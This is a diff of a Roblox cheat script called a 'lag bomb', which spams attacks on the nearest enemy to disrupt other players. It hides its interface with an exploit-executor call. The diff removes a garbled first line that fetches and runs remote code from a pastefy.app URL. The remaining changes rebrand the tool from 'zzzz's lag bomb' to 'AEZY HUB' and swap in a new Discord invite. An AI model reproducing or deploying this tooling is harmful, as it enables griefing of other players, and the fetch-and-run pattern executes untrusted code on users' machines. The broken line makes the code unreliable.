@@ -1,4 +1,3 @@
-local game GetService://pastefy.app/NZCKYdm0/raw"))()
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local StatsService = game:GetService("Stats")
@@ -8,7 +7,7 @@ local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "cryhub ui"
+ScreenGui.Name = "AEZY HUB"
 ScreenGui.ResetOnSpawn = false
 
 if syn and syn.protect_gui then
@@ -38,7 +37,7 @@ LeakedLabel.Size = UDim2.new(0, 200, 0, 20)
 LeakedLabel.Font = Enum.Font.GothamBold
 LeakedLabel.TextColor3 = Colors.LeakedText
 LeakedLabel.TextSize = 14
-LeakedLabel.Text = "Angle Hub"
+LeakedLabel.Text = "AEZY Hub"
 LeakedLabel.TextStrokeTransparency = 0.5
 
 local MainFrame = Instance.new("Frame")
@@ -62,7 +61,7 @@ Header.Size = UDim2.new(1, 0, 0, 40)
 
 local Title = Instance.new("TextLabel")
 Title.Parent = Header
-Title.Text = "zzzz's lag bomb"
+Title.Text = "AEZY'S HUB"
 Title.Font = Enum.Font.GothamBold
 Title.TextColor3 = Color3.new(1, 1, 1)
 Title.TextSize = 16
@@ -162,7 +161,7 @@ Footer.Size = UDim2.new(1, 0, 0, 10)
 Footer.Font = Enum.Font.Gotham
 Footer.TextColor3 = Color3.fromRGB(60, 60, 65)
 Footer.TextSize = 10
-Footer.Text = "discord.gg/zzzhub"
+Footer.Text = "https://discord.gg/gf8CAkFsM"
 
 -- Dragging
 local dragging, dragInput, dragStart, startPos
@@ -393,4 +392,4 @@ LagBtn.MouseButton1Click:Connect(function()
     end
 end)
 
-warn("zzzz's Lag Bomb Script Loaded - Heat Seeker Spam on Nearest Enemy!")
+
